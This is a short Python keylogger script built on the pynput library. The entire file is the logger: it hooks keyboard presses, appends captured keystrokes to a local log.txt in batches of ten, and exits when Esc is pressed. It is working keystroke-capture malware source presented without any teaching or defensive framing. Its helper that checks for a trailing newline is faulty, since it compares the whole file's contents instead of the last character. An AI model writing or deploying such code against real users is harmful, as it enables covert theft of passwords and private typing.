from pynput.keyboard import Key, Listener

count  = 0 
keys = []


def onPress(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0 
        WriteFile(keys)
        keys = []

def readfile():
    with open('log.txt', 'r') as logFile:
        lastchar = logFile.read()
        if lastchar == '\n':
            return True

def WriteFile(keys):
    with open('log.txt', "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                if readfile() == True:
                    pass
                else:
                    f.write('\n')
            elif k.find('Key') == -1:
                f.write(k)

def onRelease(key):
    if key == Key.esc: 
        return False


with Listener(on_press=onPress, on_release= onRelease) as listener:
    listener.join()

